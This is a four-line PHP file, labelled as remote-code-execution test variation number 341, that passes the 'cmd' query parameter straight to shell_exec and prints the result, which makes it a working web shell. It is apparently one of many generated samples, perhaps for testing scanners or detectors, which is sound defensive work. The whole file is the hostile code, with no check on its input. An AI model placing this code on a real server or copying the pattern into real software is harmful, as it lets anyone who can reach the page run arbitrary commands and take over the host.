<?php
// RCE test variation #341
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>